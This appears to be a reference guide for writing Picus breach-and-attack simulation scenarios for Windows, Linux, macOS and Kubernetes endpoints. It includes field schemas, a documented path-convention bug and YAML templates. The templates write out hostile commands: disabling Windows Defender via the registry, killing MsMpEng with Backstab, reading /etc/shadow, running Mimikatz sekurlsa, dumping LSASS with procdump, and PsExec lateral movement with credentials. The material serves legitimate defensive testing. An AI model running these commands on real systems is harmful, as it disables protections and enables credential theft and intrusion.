# Endpoint Module Reference

Applies to: `Endpoint Scenario`, `Linux Endpoint Scenario`, `macOS Endpoint Scenario`,
`Kubernetes Endpoint Scenario`

---

## Action-Level Fields (Endpoint Only)

| Field | Required | Type | Description |
|---|---|---|---|
| `play_processes` | **Yes** | List | Attack processes to execute. At least one required. |
| `rewind_processes` | No | List | Cleanup processes to reverse the attack. Same structure. |
| `is_privileged` | No | Boolean | Whether the action requires elevated privileges. |
| `is_remote` | No | Boolean | Whether the action executes on a remote host (lateral movement). |
| `needs_creds` | No | Boolean | Whether the action requires credentials (lateral movement). |

---

## Process Fields

Each item in `play_processes` or `rewind_processes`:

| Field | Required | Type | Description |
|---|---|---|---|
| `path` | Windows only | String | The executable. **Form depends on the OS — see Process `path` convention below.** Windows: a bare exe name (`cmd.exe`). Linux/macOS/K8s: **omit it** and put the whole command in `arguments`. |
| `arguments` | No | String | Command-line arguments passed to the executable. |
| `timeout` | No | Integer | Timeout in seconds before the process is killed. |
| `delay` | No | Integer | Delay in seconds before execution starts. |
| `is_async` | No | Boolean | Run asynchronously (don't wait for process to finish). |
| `remote_files` | No | List | Binary files the process needs. See Remote Files. |
| `success_conditions` | No | List | How to determine if the process succeeded. |

---

## Process `path` convention — get this wrong and the action silently does nothing

Measured over **1,909 genuine Picus actions** (every predefined Endpoint-family action in the
on-prem library, read via `GET /v1/threat-library/actions/{id}` -> `module_based_details.processes`):

| Module | empty path (stored as `" "`) | bare exe name | absolute path |
|---|---|---|---|
| `Endpoint Scenario` (Windows) | — | **1958 (99.1%)** | 18 (0.9%) |
| `Linux Endpoint Scenario` | **604 (97%)** | 2 | 16 |
| `macOS Endpoint Scenario` | **292 (97%)** | 1 | 8 |
| `Kubernetes Endpoint Scenario` | **251 (94%)** | 2 | 14 |

The API renders a stored empty path as a single space, which is why the Unix columns above read
`" "`. **In the YAML you author, omit the `path` key entirely** — that is what Picus's own
exported threats do. Counted in the two Unix examples bundled with this skill: the Kubernetes
C2 plan has 68 `- arguments:`-only processes vs 1 with a `path`; the macOS Realst campaign has 8
vs 3. Neither file contains a literal `path: ' '`. Writing `path: ' '` works too (the platform
normalises both), but omitting is the house form.

### Windows -> bare exe name

```yaml
play_processes:
  - path: reg.exe                      # NOT C:\Windows\System32\reg.exe
    arguments: add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

`arguments` is **not** shell-evaluated. Anything needing a pipe, `&`, `&&`, `>`, `%VAR%`
expansion or a quoted inner command must go through an interpreter:

```yaml
  - path: cmd.exe
    arguments: /c "%TMP%\Backstab.exe" -n MsMpEng.exe -k
  - path: powershell.exe
    arguments: -NoProfile -Command "Get-ADDomain; Get-ADGroupMember -Identity 'Domain Admins'"
```

A **dropped payload is never put in `path`** — Picus runs it through `cmd.exe /c` and refers to
it by its `remote_files` destination, usually under `%TMP%`:

```yaml
  - path: cmd.exe
    arguments: /c "%TMP%\tool.exe" --flag
    remote_files:
      - file: files/<base64 blob>
        path: '%TMP%\tool.exe'
        is_executable: true
        is_downloaded: true
```

### Linux / macOS / Kubernetes -> omit `path`, command in `arguments`

```yaml
play_processes:
  - arguments: bash -c 'cp /tmp/stager /dev/shm/stager; chmod +x /dev/shm/stager; /dev/shm/stager'
  - arguments: LFILE=/etc/shadow; awk '//' "$LFILE"
  - arguments: '"$WORKDIR"/implant'              # a dropped file, run from $WORKDIR
```

Unlike Windows, a dropped payload on Unix **may** be named directly in `path`
(`- path: /tmp/hack-browser-data` / `arguments: -b all`, from Picus's own Realst campaign), or
simply invoked from `arguments`. Both are used; `arguments` alone is the more common.

Here `arguments` **is** shell-evaluated, so `;`, `|`, `$(...)`, `&&` and env vars work directly.
Two Picus-injected variables are available in these modules (not Windows):

- **`"$WORKDIR"`** — the per-simulation working directory, expanded at execution time. Always quote it.
- **`$remotefile<digits>`** — a Picus-injected URL placeholder for downloader-style actions
  (`T1105`). The Windows spelling is `%remotefile-<digits>%`.

An absolute `/bin/<tool>` in `path` is used by Picus only for a single bare binary with no shell
syntax at all (`/bin/hostname`, `/bin/ps aux`, `/usr/bin/whoami`, `/bin/sh "$WORKDIR"/x.sh`).
Prefer omitting `path` — it always works and keeps one shape.

### Verified failure mode (why this matters)

Controlled A/B on the same action, same agent (`SimulationAgent04`, Windows agent **3.0.2.0**),
7 minutes apart, 2026-10-27:

| `path` written | `command` the platform reports back | process spawned | output |
|---|---|---|---|
| `C:\Windows\System32\reg.exe` | `" "` — **both fields came back empty** | none in Sysmon | none |
| `' '` (the Linux form) | `" cmd.exe /c reg add ..."` | none in Sysmon | none |
| `reg.exe` | `"reg.exe add ..."` | EID1 + EID13 | `The operation completed successfully.` |

The platform renders the command as `path + " " + arguments`, so **`command: " "` in a run
result means the agent received an empty `path` and empty `arguments`** — the signature of this
bug. The run still reports `status: COMPLETED`, but with `completion_ratio: 0` and
`prevention: "not tested"`.

Two traps that make this look like something else:

1. **`rewind_processes` with an absolute path still runs** (it is executed by
   `Picus.Simulation.AgentService.exe` as SYSTEM, a different path from play, which the Simulator
   runs as the execution user). So you see the cleanup happen and never the attack — which reads
   exactly like an EDR prevention.
2. Picus's own library does contain 18 absolute Windows paths (0.9%), so absolute is not
   categorically rejected everywhere — it may be agent-version or binary dependent. The
   mechanism is not fully established; the bare name is the house style and is known to work.

**Debug recipe:** `GET /v1/simulations/{simId}/run/{runId}/threats/{threatId}/actions/{actionId}`
and read `module_based_results.process_results[].command`. `" "` = this bug. Cross-check the
stored definition with `GET /v1/threat-library/threats/{id}/export` (plain YAML when the threat
carries no files; AES-encrypted zip when it does).

---

## Success Conditions

Each item in `success_conditions`:

| Field | Type | Description |
|---|---|---|
| `code` | Integer | Expected exit code (e.g., `0` for success). |
| `output` | String | Expected text substring in the process output. |
| `is_inverse` | Boolean | When `true`, the condition is negated — process succeeds when condition is NOT met. |

---

## Full Endpoint Action Template

```yaml
- name: action_one
  title: Execute Mimikatz Credential Dump
  description: Dumps credentials using Mimikatz sekurlsa module
  affected_os:
    - Windows
  is_atomic: true
  is_privileged: true
  ukc_phase: Credential Access
  category: Attack Scenario
  tactic: TA0006
  technique: T1003
  sub_technique: T1003.001
  malware_family: Mimikatz
  keyword_queries:
    - (("mimikatz" OR "sekurlsa" OR "lsadump"))
  result_condition:
    "true": unblocked
    "false": blocked
    condition:
      Right:
        Value: unblocked
      Left:
        Value: '%process-1%'
      Operator: eq
  play_processes:
    - path: cmd.exe
      arguments: /c "%TMP%\mimikatz.exe" "sekurlsa::logonpasswords" exit
      timeout: 60
      delay: 0
      is_async: false
      remote_files:                      # nested in the PROCESS, not the action
        - file: files/bWltaWthdHpfX18xZDZkNzQ5OS05MjczLTQwZmUtODJhNy1hN2FhMWIyZDQzMTQuZXhl
          path: '%TMP%\mimikatz.exe'       # ^ base64("mimikatz___<uuid>.exe")
          is_executable: true
          is_downloaded: true
      success_conditions:
        - code: 0
        - output: "sekurlsa::logonpasswords"
          is_inverse: false
  rewind_processes:
    - path: cmd.exe
      arguments: /c del "%TMP%\mimikatz.exe"
      timeout: 30
```

---

## Lateral Movement Action Template (Endpoint Scenario only)

```yaml
- name: lateral_move
  title: Lateral Movement via PsExec
  is_atomic: true
  is_remote: true
  needs_creds: true
  is_privileged: true
  ukc_phase: Lateral Movement
  category: Lateral Movement Techniques
  tactic: TA0008
  technique: T1021
  affected_os:
    - Windows
  play_processes:
    - path: cmd.exe
      arguments: /c "%TMP%\psexec.exe" \\target -u admin -p pass cmd.exe /c whoami
      timeout: 120
      remote_files:
        - file: files/psexec.exe
          path: '%TMP%\psexec.exe'
          is_executable: true
          is_downloaded: true
      success_conditions:
        - code: 0
```

---

## Multi-Process Action Template

An action can have multiple play_processes executed in sequence:

```yaml
- name: multi_stage
  title: Download and Execute Payload
  is_atomic: false
  ukc_phase: Execution
  category: Attack Scenario
  play_processes:
    - path: cmd.exe
      arguments: /c copy files\stage1.exe "%TMP%\stage1.exe"
      timeout: 30
      remote_files:
        - file: files/stage1.exe
          path: '%TMP%\stage1.exe'
          is_executable: true
          is_downloaded: true
    - path: cmd.exe
      arguments: /c "%TMP%\stage1.exe" --silent
      timeout: 60
      delay: 5
      success_conditions:
        - code: 0
          is_inverse: false
  rewind_processes:
    - path: cmd.exe
      arguments: /c del "%TMP%\stage1.exe"
      timeout: 15
```

---

## Full Campaign Example — Endpoint Scenario

```yaml
campaign:
  name: APT29 Credential Harvesting Simulation
  module: Endpoint Scenario
  severity: High
  description: Simulates APT29 credential harvesting using LSASS dumping techniques.
  affected_os:
    - Windows
  threat_actor: APT29
  result_condition:
    "true": unblocked
    "false": blocked
    condition:
      Right:
        Value: unblocked
      Left:
        Value: '%objective-1%'
      Operator: eq
  objectives:
    - type: Credential Access
      result_condition:
        "true": unblocked
        "false": blocked
        condition:
          Terms:
            - Right:
                Value: unblocked
              Left:
                Value: '%action-1%'
              Operator: eq
          Operator: and
      actions:
        - name: dump_lsass
          title: Dump LSASS Process Memory
          description: Uses procdump to capture LSASS memory for offline credential extraction
          affected_os:
            - Windows
          is_atomic: true
          is_privileged: true
          ukc_phase: Credential Access
          category: Attack Scenario
          tactic: TA0006
          technique: T1003
          sub_technique: T1003.001
          keyword_queries:
            - (("procdump" OR "lsass.dmp" OR "T1003.001"))
          play_processes:
            - path: cmd.exe
              arguments: /c procdump.exe -accepteula -ma lsass C:\Temp\lsass.dmp
              timeout: 120
              remote_files:
                - file: files/procdump.exe
                  path: '%TMP%\procdump.exe'
                  is_executable: true
                  is_downloaded: true
              success_conditions:
                - code: 0
                - output: "Dump 1 complete"
          rewind_processes:
            - path: cmd.exe
              arguments: /c del C:\Temp\lsass.dmp & del C:\Temp\procdump.exe
              timeout: 30
```
